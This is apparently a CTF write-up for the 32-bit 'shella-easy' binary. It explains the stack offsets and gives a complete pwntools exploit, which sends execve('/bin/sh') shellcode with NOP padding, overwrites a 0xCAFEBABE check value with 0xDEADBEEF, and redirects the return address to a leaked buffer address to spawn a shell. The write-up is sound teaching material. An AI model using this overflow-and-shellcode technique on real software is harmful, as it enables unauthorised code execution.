# App

![image](https://user-images.githubusercontent.com/115867891/206499219-80b7668c-7137-4847-95b5-5349c511b004.png)

32-bit, no mitigations

# Dissasembly

![image](https://user-images.githubusercontent.com/115867891/206500127-a3a2a4f6-1bb7-4480-b8fc-6faedbb53485.png)

Basically same as the rest shellcode CTFs but with an extra "challenge". From the start of the buffer for `gets` until the ret address there are 
0x48 + 0x8 bytes, however we must first overwrite the variable located at `[ebp-0x8]` to be `0xDEADBEEF` instead of `0xCAFEBABE`. The distance
between buffer and that variable is 0x44.

This means we need:

`shellcode` + `NOPs until 0xCAFEBABE` + `0xDEADBEEF` + `NOPs until ret addr`

# Exploit

```
from pwn import *
import re

target = process('./shella-easy')

# Scan line
leak = target.recvline()

# Strip away the characters not part of our address
shellcodeAdr = int(str(leak).split()[4][2:], 16)
print("Leaked addr : ", shellcodeAdr)

SIZE_VAR_TO_OWR = 0x4
deadbeef = p32(0xdeadbeef)

# Make the payload
payload = b""

buf =  b""
buf += b"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f"
buf += b"\x62\x69\x6e\x89\xe3\xcd\x80"

# Add the shellcode                                   
payload += buf

# Add NOPS that will read the beginning of the 0xCAFEBABE
payload += b"\x90" * (0x44 - len(payload) - SIZE_VAR_TO_OWR)

# Overwrite 0xCAFEBABE with 0xDEADBEEF and reach return address
payload += deadbeef + b"\x90" * 0x8

# Overwrite return address with the leaked address (start of the shellcode)
payload += p32(shellcodeAdr)

print("Size : ", hex(len(payload)))
# Send the payload
target.sendline(payload)

# Drop to an interactive shell to use our newly popped shell
target.interactive()
```

![image](https://user-images.githubusercontent.com/115867891/206500803-b0410415-910a-421c-90a8-09f6d6d71258.png)

